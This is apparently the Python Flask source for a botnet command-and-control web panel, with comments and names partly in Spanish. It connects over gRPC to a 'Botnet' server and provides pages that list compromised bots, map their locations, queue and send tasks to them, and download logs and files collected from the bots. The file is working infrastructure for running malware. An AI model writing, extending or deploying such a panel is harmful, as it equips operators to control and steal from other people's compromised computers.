from flask import Flask, send_from_directory, render_template, request, redirect, abort
from protos.botnet_pb2 import *
from protos.botnet_pb2_grpc import *
from flaskapp.app.modules import files, map, bots, tareas
import grpc

app = Flask(__name__, template_folder="./app/templates", static_folder="./app/static")
client = None

def start_server():
    global client
    with open("./certs/localhost.crt", "rb") as f:
        creds = grpc.ssl_channel_credentials(f.read())
    channel = grpc.secure_channel("localhost:50051", creds)
    try:
        grpc.channel_ready_future(channel).result(timeout=5)
    except grpc.FutureTimeoutError:
        pass
    else:
        client = BotnetStub(channel)

@app.route("/static/css/bonet.css")
def favicon():
    return send_from_directory("./app/static/css", "botnet.css")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/bots")
def bots_main():
    try:
        if client == None:
            start_server()
        lista, total = bots.get_bots(client)
        return render_template("bots.html", lista=lista, total=total)
    except:
        abort(500)

@app.route("/bots/<id>")
def bot_page(id):
    try:
        if client == None:
            start_server()
        bot, tasks, complete, tasks_n, complete_n, geomap, geobot = bots.get_bot(client, id)
        return render_template("bots/bot.html", bot=bot, tasks=tasks, complete=complete, tasks_n=tasks_n, complete_n=complete_n, botid=id, geomap=geomap, geobot=geobot)
    except:
        abort(500)

@app.route("/tasks")
def tasks():
    try:
        if client == None:
            start_server()
        total, t, c, tasks, complete = tareas.get_tasks(client)
        return render_template("tasks.html", bots=total, t=t, c=c, tareas=tasks, complete=complete)
    except:
        abort(500)

@app.route("/tasks/add", methods=["GET", "POST"])
def add_tasks():
    try:
        if client == None:
            start_server()
        if request.method == "GET":
            bots, total = tareas.show_task_menu(client)
            return render_template("tasks/add.html", bots=bots, total=total)
        else:
            tareas.send_tasks(client, request)
            return redirect("/tasks", code=302)
    except:
        abort(500)

@app.route("/tasks/<id>")
def task(id):
    try:
        if client == None:
            start_server()
        return render_template("tasks/task.html", complete=tareas.get_task(client, id))
    except:
        abort(500)

@app.route('/logs')
def logs():
    return render_template('logs.html', logs=files.get_files("./server/logs"))

@app.route(f"/logs/server/<path:filename>", methods=["GET"])
@app.route(f'/logs/bots/<path:filename>', methods=['GET'])
def download_log(filename):
    return send_from_directory(files.download_log(request.url_rule), filename)

@app.route('/files')
def file():
    return render_template('files.html', files=files.get_files("./server/files/bots"))

@app.route(f"/files/bots/<path:filename>", methods=["GET"])
@app.route(f"/files/upload/<path:filename>", methods=["GET"])
def download_file(filename):
    ruta, f = files.download_file(request.url_rule, filename)
    return send_from_directory(ruta, f)

@app.route("/global")
def maps():
    try:
        if client == None:
            start_server()
        return render_template("global.html", bots=map.get_bots(client))
    except:
        abort(500)

@app.errorhandler(grpc.RpcError)
@app.errorhandler(500)
def server_error(e):
    return render_template('500.html'), 500

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

if __name__ == "__main__":
    start_server()
    app.run(host="127.0.0.1", port=8080, debug=True)